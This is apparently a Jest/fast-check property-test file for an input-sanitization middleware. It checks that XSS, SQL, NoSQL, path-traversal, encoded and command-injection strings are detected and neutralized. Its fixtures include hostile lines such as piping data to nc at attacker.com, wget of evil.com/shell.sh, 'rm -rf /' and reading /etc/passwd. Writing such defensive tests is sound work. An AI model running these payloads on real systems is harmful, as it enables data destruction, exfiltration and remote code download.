/**
 * Property-Based Tests for Input Sanitization Security
 * **Validates: Requirements 1.3**
 * 
 * Property 2: Input Sanitization Security
 * For any user input containing potentially malicious content, the sanitizer should 
 * clean the input before validation and prevent security vulnerabilities like XSS, 
 * SQL injection, NoSQL injection, and command injection attacks.
 */

const fc = require('fast-check');
const {
  sanitizeStringWithThreatDetection,
  sanitizeObjectWithThreatDetection,
  generateCorrelationId
} = require('../middleware/validation');

describe('Property 2: Input Sanitization Security', () => {
  
  /**
   * **Validates: Requirements 1.3**
   * Property 2.1: XSS Attack Prevention
   * 
   * For any XSS payload, the sanitizer should detect and neutralize the threat
   */
  test('Property 2.1: XSS payloads are consistently neutralized', () => {
    fc.assert(fc.property(
      fc.oneof(
        // Script tag variations
        fc.constant('<script>alert("xss")</script>'),
        fc.constant('<SCRIPT>alert("xss")</SCRIPT>'),
        fc.constant('<script src="evil.js"></script>'),
        
        // Event handler variations
        fc.constant('<img src="x" onerror="alert(1)">'),
        fc.constant('<div onclick="alert(1)">click</div>'),
        fc.constant('<body onload="alert(1)">'),
        
        // JavaScript protocol variations
        fc.constant('javascript:alert("xss")'),
        fc.constant('JAVASCRIPT:alert("xss")'),
        
        // Iframe variations
        fc.constant('<iframe src="javascript:alert(1)"></iframe>'),
        fc.constant('<iframe src="data:text/html,<script>alert(1)</script>"></iframe>'),
        
        // SVG variations
        fc.constant('<svg onload="alert(1)">'),
        fc.constant('<svg><script>alert(1)</script></svg>')
      ),
      (xssPayload) => {
        const context = {
          timestamp: new Date().toISOString(),
          correlationId: generateCorrelationId(),
          ip: '127.0.0.1',
          userAgent: 'test-agent',
          method: 'POST',
          path: '/test'
        };

        const { sanitized, detected } = sanitizeStringWithThreatDetection(xssPayload, context);

        // Property: XSS threats should be detected
        expect(detected.length).toBeGreaterThan(0);
        const xssThreats = detected.filter(threat => 
          threat.type.startsWith('XSS_') || 
          threat.type === 'DANGEROUS_HTML_TAG' ||
          threat.type === 'DANGEROUS_JS_FUNCTION'
        );
        expect(xssThreats.length).toBeGreaterThan(0);

        // Property: Dangerous XSS patterns should be removed or neutralized
        expect(sanitized).not.toMatch(/<script[^>]*>/i);
        expect(sanitized).not.toMatch(/javascript:/i);
        expect(sanitized).not.toMatch(/on\w+\s*=/i);
        expect(sanitized).not.toMatch(/<iframe[^>]*>/i);
        expect(sanitized).not.toMatch(/<svg[^>]*>/i);

        // Property: Sanitized content should be different from original
        expect(sanitized).not.toBe(xssPayload);

        return true;
      }
    ), { numRuns: 10 });
  });

  /**
   * **Validates: Requirements 1.3**
   * Property 2.2: SQL Injection Prevention
   * 
   * For any SQL injection payload, the sanitizer should detect and neutralize the threat
   */
  test('Property 2.2: SQL injection payloads are consistently neutralized', () => {
    fc.assert(fc.property(
      fc.oneof(
        // Classic SQL injection
        fc.constant("'; DROP TABLE users; --"),
        fc.constant("1' OR '1'='1"),
        fc.constant("admin'/*"),
        fc.constant("' UNION SELECT * FROM passwords --"),
        
        // Advanced SQL injection
        fc.constant("1; DELETE FROM users WHERE 1=1; --"),
        fc.constant("' OR 1=1#"),
        fc.constant("1' AND (SELECT COUNT(*) FROM users) > 0 --"),
        fc.constant("'; INSERT INTO users VALUES ('hacker', 'pass'); --")
      ),
      (sqlPayload) => {
        const context = {
          timestamp: new Date().toISOString(),
          correlationId: generateCorrelationId(),
          ip: '127.0.0.1',
          userAgent: 'test-agent',
          method: 'POST',
          path: '/test'
        };

        const { sanitized, detected } = sanitizeStringWithThreatDetection(sqlPayload, context);

        // Property: SQL injection threats should be detected
        expect(detected.length).toBeGreaterThan(0);
        const sqlThreats = detected.filter(threat => 
          threat.type === 'SQL_INJECTION_KEYWORD' || threat.type === 'SQL_INJECTION_CHAR'
        );
        expect(sqlThreats.length).toBeGreaterThan(0);

        // Property: SQL injection patterns should be neutralized
        expect(sanitized).not.toMatch(/drop\s+table/i);
        expect(sanitized).not.toMatch(/union\s+select/i);
        expect(sanitized).not.toMatch(/delete\s+from/i);
        expect(sanitized).not.toMatch(/insert\s+into/i);

        // Property: Sanitized content should be different from original
        expect(sanitized).not.toBe(sqlPayload);

        return true;
      }
    ), { numRuns: 10 });
  });

  /**
   * **Validates: Requirements 1.3**
   * Property 2.3: NoSQL Injection Prevention
   * 
   * For any NoSQL injection payload, the sanitizer should detect and neutralize the threat
   */
  test('Property 2.3: NoSQL injection payloads are consistently neutralized', () => {
    fc.assert(fc.property(
      fc.oneof(
        // MongoDB operator injection
        fc.constant('{"$where": "this.password"}'),
        fc.constant('{"$ne": null}'),
        fc.constant('{"$gt": ""}'),
        fc.constant('{"$regex": ".*"}'),
        fc.constant('{"$exists": true}'),
        
        // Advanced MongoDB injection
        fc.constant('{"$or": [{"password": {"$regex": ".*"}}, {"username": "admin"}]}'),
        fc.constant('{"$where": "function() { return this.username == \'admin\' }"}'),
        fc.constant('{"username": {"$in": ["admin", "root"]}}')
      ),
      (nosqlPayload) => {
        const context = {
          timestamp: new Date().toISOString(),
          correlationId: generateCorrelationId(),
          ip: '127.0.0.1',
          userAgent: 'test-agent',
          method: 'POST',
          path: '/test'
        };

        const { sanitized, detected } = sanitizeStringWithThreatDetection(nosqlPayload, context);

        // Property: NoSQL injection threats should be detected
        expect(detected.length).toBeGreaterThan(0);
        const nosqlThreats = detected.filter(threat => threat.type === 'NOSQL_INJECTION');
        expect(nosqlThreats.length).toBeGreaterThan(0);

        // Property: NoSQL operators should be removed
        expect(sanitized).not.toMatch(/\$where/i);
        expect(sanitized).not.toMatch(/\$ne/i);
        expect(sanitized).not.toMatch(/\$gt/i);
        expect(sanitized).not.toMatch(/\$regex/i);
        expect(sanitized).not.toMatch(/\$exists/i);
        expect(sanitized).not.toMatch(/\$or/i);
        expect(sanitized).not.toMatch(/\$in/i);

        // Property: Sanitized content should be different from original
        expect(sanitized).not.toBe(nosqlPayload);

        return true;
      }
    ), { numRuns: 10 });
  });

  /**
   * **Validates: Requirements 1.3**
   * Property 2.4: Command Injection Prevention
   * 
   * For any command injection payload, the sanitizer should detect and neutralize the threat
   */
  test('Property 2.4: Command injection payloads are consistently neutralized', () => {
    fc.assert(fc.property(
      fc.oneof(
        // Unix/Linux command injection
        fc.constant('file.txt; rm -rf /'),
        fc.constant('data | nc attacker.com 4444'),
        fc.constant('input && wget evil.com/shell.sh'),
        fc.constant('test `whoami`'),
        fc.constant('file $(cat /etc/passwd)'),
        
        // Windows command injection
        fc.constant('file.txt & del /f /q C:\\*'),
        fc.constant('data | powershell -c "Invoke-WebRequest evil.com"'),
        fc.constant('input && cmd /c "dir C:\\"')
      ),
      (cmdPayload) => {
        const context = {
          timestamp: new Date().toISOString(),
          correlationId: generateCorrelationId(),
          ip: '127.0.0.1',
          userAgent: 'test-agent',
          method: 'POST',
          path: '/test'
        };

        const { sanitized, detected } = sanitizeStringWithThreatDetection(cmdPayload, context);

        // Property: Command injection threats should be detected
        expect(detected.length).toBeGreaterThan(0);
        const cmdThreats = detected.filter(threat => 
          threat.type === 'COMMAND_INJECTION' || threat.type === 'PATH_TRAVERSAL'
        );
        expect(cmdThreats.length).toBeGreaterThan(0);

        // Property: Command injection patterns should be neutralized
        expect(sanitized).not.toMatch(/;\s*rm/i);
        expect(sanitized).not.toMatch(/\|\s*nc/i);
        expect(sanitized).not.toMatch(/&&\s*wget/i);
        expect(sanitized).not.toMatch(/`\w+`/);
        expect(sanitized).not.toMatch(/\$\(/);
        expect(sanitized).not.toMatch(/&\s*del/i);

        // Property: Sanitized content should be different from original
        expect(sanitized).not.toBe(cmdPayload);

        return true;
      }
    ), { numRuns: 10 });
  });

  /**
   * **Validates: Requirements 1.3**
   * Property 2.5: Path Traversal Prevention
   * 
   * For any path traversal payload, the sanitizer should detect and neutralize the threat
   */
  test('Property 2.5: Path traversal attacks are consistently neutralized', () => {
    fc.assert(fc.property(
      fc.oneof(
        // Unix path traversal
        fc.constant('../../../etc/passwd'),
        fc.constant('....//....//....//etc/passwd'),
        fc.constant('/etc/passwd'),
        fc.constant('../../../../../../etc/shadow'),
        
        // Windows path traversal
        fc.constant('..\\..\\..\\windows\\system32\\config\\sam'),
        fc.constant('....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts'),
        fc.constant('C:\\windows\\system32\\config\\sam')
      ),
      (pathPayload) => {
        const context = {
          timestamp: new Date().toISOString(),
          correlationId: generateCorrelationId(),
          ip: '127.0.0.1',
          userAgent: 'test-agent',
          method: 'POST',
          path: '/test'
        };

        const { sanitized, detected } = sanitizeStringWithThreatDetection(pathPayload, context);

        // Property: Path traversal threats should be detected
        expect(detected.length).toBeGreaterThan(0);
        const pathThreats = detected.filter(threat => threat.type === 'PATH_TRAVERSAL');
        expect(pathThreats.length).toBeGreaterThan(0);

        // Property: Path traversal sequences should be removed
        expect(sanitized).not.toMatch(/\.\.\//);
        expect(sanitized).not.toMatch(/\.\.\\/);

        // Property: Sanitized content should be different from original
        expect(sanitized).not.toBe(pathPayload);

        return true;
      }
    ), { numRuns: 10 });
  });

  /**
   * **Validates: Requirements 1.3**
   * Property 2.6: Safe Content Preservation
   * 
   * For any safe content, the sanitizer should preserve it while removing threats
   */
  test('Property 2.6: Safe content is preserved while threats are removed', () => {
    fc.assert(fc.property(
      fc.record({
        safeText: fc.string().filter(s => 
          s.length > 0 && s.length < 100 && 
          !/[<>&"'`$;|]/.test(s) && 
          !s.includes('script') && 
          !s.includes('javascript') &&
          !s.includes('DROP') &&
          !s.includes('SELECT') &&
          !s.includes('$where')
        ),
        maliciousText: fc.oneof(
          fc.constant('<script>alert("xss")</script>'),
          fc.constant("'; DROP TABLE users; --"),
          fc.constant('{"$where": "this.password"}'),
          fc.constant('file.txt; rm -rf /')
        )
      }),
      ({ safeText, maliciousText }) => {
        const context = {
          timestamp: new Date().toISOString(),
          correlationId: generateCorrelationId(),
          ip: '127.0.0.1',
          userAgent: 'test-agent',
          method: 'POST',
          path: '/test'
        };

        const { sanitized: safeSanitized } = sanitizeStringWithThreatDetection(safeText, context);
        const { sanitized: maliciousSanitized, detected } = sanitizeStringWithThreatDetection(maliciousText, context);

        // Property: Safe content should be preserved (or minimally changed)
        expect(safeSanitized).toBe(safeText);

        // Property: Malicious content should be detected and sanitized
        expect(detected.length).toBeGreaterThan(0);
        expect(maliciousSanitized).not.toBe(maliciousText);

        return true;
      }
    ), { numRuns: 10 });
  });

  /**
   * **Validates: Requirements 1.3**
   * Property 2.7: Complex Object Sanitization
   * 
   * For any complex object containing threats, all threats should be detected and sanitized
   */
  test('Property 2.7: Complex objects with nested threats are fully sanitized', () => {
    fc.assert(fc.property(
      fc.record({
        maliciousField: fc.oneof(
          fc.constant('<script>alert("xss")</script>'),
          fc.constant("'; DROP TABLE users; --"),
          fc.constant('{"$where": "this.password"}'),
          fc.constant('file.txt; rm -rf /'),
          fc.constant('../../../etc/passwd')
        ),
        safeField: fc.string().filter(s => s.length < 50 && !/[<>&"'`$;|]/.test(s)),
        nestedData: fc.record({
          innerMalicious: fc.constant('<iframe src="javascript:alert(1)"></iframe>'),
          innerSafe: fc.string().filter(s => s.length < 30 && !/[<>&"']/.test(s))
        })
      }),
      (testData) => {
        const context = {
          timestamp: new Date().toISOString(),
          correlationId: generateCorrelationId(),
          ip: '127.0.0.1',
          userAgent: 'test-agent',
          method: 'POST',
          path: '/test'
        };

        const { sanitized, threats } = sanitizeObjectWithThreatDetection(testData, context);

        // Property: All threats should be detected
        expect(threats.length).toBeGreaterThan(0);

        // Property: All malicious content should be sanitized
        const sanitizedJson = JSON.stringify(sanitized);
        expect(sanitizedJson).not.toMatch(/<script/i);
        expect(sanitizedJson).not.toMatch(/drop\s+table/i);
        expect(sanitizedJson).not.toMatch(/\$where/i);
        expect(sanitizedJson).not.toMatch(/rm\s+-rf/i);
        expect(sanitizedJson).not.toMatch(/\.\.\//);
        expect(sanitizedJson).not.toMatch(/<iframe/i);

        // Property: Safe content should be preserved
        expect(sanitized.safeField).toBe(testData.safeField);
        expect(sanitized.nestedData.innerSafe).toBe(testData.nestedData.innerSafe);

        return true;
      }
    ), { numRuns: 10 });
  });

  /**
   * **Validates: Requirements 1.3**
   * Property 2.8: Encoding Detection
   * 
   * For any encoded malicious payload, the sanitizer should detect encoding attempts
   */
  test('Property 2.8: Encoded malicious payloads are detected and handled', () => {
    fc.assert(fc.property(
      fc.oneof(
        // URL encoded payloads
        fc.constant('%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E'),
        fc.constant('%27%3B%20DROP%20TABLE%20users%3B%20--'),
        
        // HTML entity encoded payloads
        fc.constant('&#60;script&#62;alert&#40;&#34;xss&#34;&#41;&#60;&#47;script&#62;'),
        fc.constant('&#x27;&#x3B;&#x20;DROP&#x20;TABLE&#x20;users&#x3B;&#x20;--'),
        
        // Unicode encoded payloads
        fc.constant('\\u003cscript\\u003ealert\\u0028\\u0022xss\\u0022\\u0029\\u003c\\u002fscript\\u003e')
      ),
      (encodedPayload) => {
        const context = {
          timestamp: new Date().toISOString(),
          correlationId: generateCorrelationId(),
          ip: '127.0.0.1',
          userAgent: 'test-agent',
          method: 'POST',
          path: '/test'
        };

        const { sanitized, detected } = sanitizeStringWithThreatDetection(encodedPayload, context);

        // Property: Some form of threat should be detected (encoding or content)
        expect(detected.length).toBeGreaterThan(0);

        // Property: Encoded content should be processed
        expect(sanitized).not.toBe(encodedPayload);

        return true;
      }
    ), { numRuns: 10 });
  });

  /**
   * **Validates: Requirements 1.3**
   * Property 2.9: Length Limit Protection
   * 
   * For any excessively long input, the sanitizer should enforce length limits
   */
  test('Property 2.9: Length limits prevent DoS attacks', () => {
    fc.assert(fc.property(
      fc.string().filter(s => s.length > 1000), // Generate long strings
      (longString) => {
        const context = {
          timestamp: new Date().toISOString(),
          correlationId: generateCorrelationId(),
          ip: '127.0.0.1',
          userAgent: 'test-agent',
          method: 'POST',
          path: '/test'
        };

        const { sanitized, detected } = sanitizeStringWithThreatDetection(
          longString, 
          context, 
          { maxLength: 500 }
        );

        // Property: Long strings should be truncated
        expect(sanitized.length).toBeLessThanOrEqual(500);

        // Property: Length limit exceeded should be detected
        const lengthThreats = detected.filter(threat => 
          threat.type === 'LENGTH_LIMIT_EXCEEDED'
        );
        expect(lengthThreats.length).toBeGreaterThan(0);

        return true;
      }
    ), { numRuns: 10 });
  });

  /**
   * **Validates: Requirements 1.3**
   * Property 2.10: Threat Detection Consistency
   * 
   * For any malicious payload, threat detection should be consistent across multiple runs
   */
  test('Property 2.10: Threat detection is consistent across multiple sanitization runs', () => {
    fc.assert(fc.property(
      fc.oneof(
        fc.constant('<script>alert("xss")</script>'),
        fc.constant("'; DROP TABLE users; --"),
        fc.constant('{"$where": "this.password"}'),
        fc.constant('file.txt; rm -rf /'),
        fc.constant('../../../etc/passwd')
      ),
      (maliciousPayload) => {
        const context = {
          timestamp: new Date().toISOString(),
          correlationId: generateCorrelationId(),
          ip: '127.0.0.1',
          userAgent: 'test-agent',
          method: 'POST',
          path: '/test'
        };

        // Run sanitization multiple times
        const run1 = sanitizeStringWithThreatDetection(maliciousPayload, context);
        const run2 = sanitizeStringWithThreatDetection(maliciousPayload, context);
        const run3 = sanitizeStringWithThreatDetection(maliciousPayload, context);

        // Property: Results should be consistent
        expect(run1.sanitized).toBe(run2.sanitized);
        expect(run2.sanitized).toBe(run3.sanitized);

        // Property: Threat detection should be consistent
        expect(run1.detected.length).toBe(run2.detected.length);
        expect(run2.detected.length).toBe(run3.detected.length);

        // Property: All runs should detect threats
        expect(run1.detected.length).toBeGreaterThan(0);
        expect(run2.detected.length).toBeGreaterThan(0);
        expect(run3.detected.length).toBeGreaterThan(0);

        return true;
      }
    ), { numRuns: 10 });
  });
});